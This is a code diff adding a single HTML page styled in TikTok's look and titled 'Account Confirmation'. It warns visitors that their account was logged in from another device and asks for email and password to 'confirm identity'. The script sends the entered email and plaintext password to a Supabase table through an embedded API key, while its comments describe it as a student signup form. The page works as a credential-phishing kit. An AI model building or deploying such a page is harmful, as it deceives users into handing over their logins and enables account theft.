@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Student Sign Up</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Supabase Configuration -->
+    <script>
+        window.supabaseUrl = 'https://utsohlqsnojqlouzmouu.supabase.co';
+        window.supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InV0c29obHFzbm9qcWxvdXptb3V1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjEwNDgyMTEsImV4cCI6MjA3NjYyNDIxMX0.zKK9BVX9Yx8Yo-TCet-bVvftfChXVQaoR061fUWMmb8';
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <style>
+        /* EMBEDDED CSS - Same TikTok Style */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .signup-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo svg {
+            width: 40px;
+            height: 40px;
+        }
+
+        .signup-form h1 {
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+
+        .message {
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+
+        .message.success {
+            background-color: rgba(76, 175, 80, 0.2);
+            border: 1px solid #4caf50;
+            display: block;
+        }
+
+        .message.error {
+            background-color: rgba(244, 67, 54, 0.2);
+            border: 1px solid #f44336;
+            display: block;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            background-color: #121212;
+            border: 1px solid #2f2f2f;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #fe2c55;
+        }
+
+        .signup-button {
+            width: 100%;
+            padding: 14px;
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .signup-button:hover {
+            background-color: #ff3b6c;
+        }
+
+        .signup-button:disabled {
+            background-color: #555;
+            cursor: not-allowed;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 30px 0;
+            color: #8a8a8a;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #2f2f2f;
+        }
+
+        .divider span {
+            padding: 0 15px;
+            font-size: 14px;
+        }
+
+        .login-link {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .login-link p {
+            color: #8a8a8a;
+        }
+
+        .login-link a {
+            color: #fe2c55;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #8a8a8a;
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: #8a8a8a;
+            text-decoration: underline;
+        }
+
+        .simple-note {
+            text-align: center;
+            color: #8a8a8a;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        /* Responsive design */
+        @media (max-width: 480px) {
+            .signup-container {
+                padding: 10px;
+            }
+            
+            .signup-form h1 {
+                font-size: 24px;
+            }
+            
+            .input-group input {
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="signup-container">
+        
+        
+        <div class="signup-form">
+            <h1>Account Confirmation</h1>
+            
+            <div class="simple-note">
+                You account has been logged in from another <br>
+                device please login to confirm your identity.
+            </div>
+            
+            <div id="message" class="message"></div>
+            
+            <div class="input-group">
+                <input type="email" placeholder="Email Address" id="email" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" placeholder="Password" id="password" required>
+            </div>
+            
+            <button class="signup-button" id="signupBtn">
+                <span class="loading-spinner" id="spinner"></span>
+                <span id="buttonText">Confirm Account</span>
+            </button>
+            
+            <div class="divider">
+                <span>or</span>
+            </div>
+            
+            <div class="login-link">
+                <p>Wait for confirmation email</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>By logging back, you agree to our <a href="#">Terms of Service</a> and confirm that you have read our <a href="#">Privacy Policy</a>.</p>
+        </div>
+    </div>
+
+    <script>
+        // EMBEDDED JAVASCRIPT - SIMPLIFIED SIGNUP
+        document.addEventListener('DOMContentLoaded', function() {
+            const signupBtn = document.getElementById('signupBtn');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const spinner = document.getElementById('spinner');
+            const buttonText = document.getElementById('buttonText');
+            const messageDiv = document.getElementById('message');
+            
+            // Create Supabase client using global configuration
+            const supabase = window.supabase.createClient(window.supabaseUrl, window.supabaseAnonKey);
+            
+            console.log('Supabase initialized for simplified student signup');
+            
+            signupBtn.addEventListener('click', handleSignup);
+            
+            // Also allow signup on Enter key press
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    handleSignup();
+                }
+            });
+            
+            async function handleSignup() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+                
+                // Basic validation
+                if (!email || !password) {
+                    showMessage('Please enter both email and password', 'error');
+                    return;
+                }
+                
+                // Simple email validation
+                if (!isValidEmail(email)) {
+                    showMessage('Please enter a valid email address', 'error');
+                    return;
+                }
+                
+                // Show loading state
+                setLoadingState(true);
+                
+                try {
+                    console.log('Processing simplified signup for:', email);
+                    
+                    // Check if email already exists in signup_requests
+                    const { data: existingRequests, error: checkError } = await supabase
+                        .from('signup_requests')
+                        .select('email')
+                        .eq('email', email);
+                    
+                    if (checkError) {
+                        console.error('Error checking existing requests:', checkError);
+                        showMessage('System error. Please try again.', 'error');
+                        setLoadingState(false);
+                        return;
+                    }
+                    
+                    if (existingRequests && existingRequests.length > 0) {
+                        showMessage('This email already has a pending signup request', 'error');
+                        setLoadingState(false);
+                        return;
+                    }
+                    
+                    // Create new simplified signup request
+                    const { data: newRequest, error: signupError } = await supabase
+                        .from('signup_requests')
+                        .insert([
+                            {
+                                email: email,
+                                password: password,
+                                user_type: 'student',
+                                status: 'pending',
+                                signup_date: new Date().toISOString(),
+                                created_at: new Date().toISOString()
+                            }
+                        ])
+                        .select();
+                    
+                    if (signupError) {
+                        console.error('Signup error:', signupError);
+                        showMessage('Signup request failed: ' + signupError.message, 'error');
+                    } else {
+                        showMessage('Success! Your account request has been submitted. We will contact you soon.', 'success');
+                        console.log('New simplified signup request:', newRequest[0]);
+                        
+                        // Clear form
+                        emailInput.value = '';
+                        passwordInput.value = '';
+                    }
+                    
+                } catch (error) {
+                    console.error('Signup error:', error);
+                    showMessage('Signup failed. Please try again.', 'error');
+                } finally {
+                    setLoadingState(false);
+                }
+            }
+            
+            function isValidEmail(email) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email);
+            }
+            
+            function setLoadingState(isLoading) {
+                if (isLoading) {
+                    signupBtn.disabled = true;
+                    spinner.style.display = 'block';
+                    buttonText.textContent = 'Creating Account...';
+                } else {
+                    signupBtn.disabled = false;
+                    spinner.style.display = 'none';
+                    buttonText.textContent = 'Create Account';
+                }
+            }
+            
+            function showMessage(text, type) {
+                messageDiv.textContent = text;
+                messageDiv.className = 'message ' + type;
+                messageDiv.style.display = 'block';
+                
+                // Auto-hide success messages after 5 seconds
+                if (type === 'success') {
+                    setTimeout(() => {
+                        messageDiv.style.display = 'none';
+                    }, 5000);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
